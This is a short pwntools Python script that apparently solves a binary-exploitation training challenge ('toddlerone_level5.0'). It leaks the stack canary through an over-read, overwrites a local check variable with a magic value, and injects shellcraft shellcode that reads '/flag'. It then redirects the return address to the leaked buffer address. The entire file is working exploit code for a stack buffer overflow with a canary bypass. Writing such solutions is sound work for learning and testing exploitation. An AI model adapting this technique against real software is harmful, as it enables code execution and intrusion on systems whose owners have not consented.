from pwn import *

# initialization
context.arch = 'amd64'
context.endian = 'little'
elf = ELF("/challenge/toddlerone_level5.0")
io = elf.process()

# Vars
distance_canary = 32 #0x20
distance_buffer = 136 #0x88
distance_between_buffer_and_canary = distance_buffer - distance_canary
distance_local_38 = 56 #0x38
distance_between_local_38_and_canary = distance_local_38 - distance_canary
distance_between_buffer_and_local_38 = distance_buffer - distance_local_38

# Leak the canary
io.recvuntil("size:")
io.sendline(f'{distance_between_buffer_and_canary + 1}')
io.recvuntil("bytes)!")

payload_first_run = b'A' * (distance_between_buffer_and_canary - 6) + b'REPEATZ'
io.sendline(payload_first_run)

io.recvuntil(b'REPEATZ')
canary = b'\x00' + io.recvline().strip()[:7]

# Exploit
io.readuntil(b'The input buffer begins at 0x')
buffer_addr = int(io.readuntil(b',').decode()[:-1], 16)

io.recvuntil("size:")
io.sendline(str(distance_buffer + 8))


shellcode = asm(shellcraft.cat('/flag'))
print("Shellcode length: " + str(len(shellcode)))
local_38 = p64(0xaced06657d665e7e)
payload_second_run = shellcode + b'A'*(distance_between_buffer_and_local_38 - len(shellcode)) + local_38 + b'A'*(distance_between_local_38_and_canary - 8)+ canary + b'A'*24 + p64(buffer_addr)

io.recvuntil("bytes)!")
io.sendline(payload_second_run)
io.interactive()

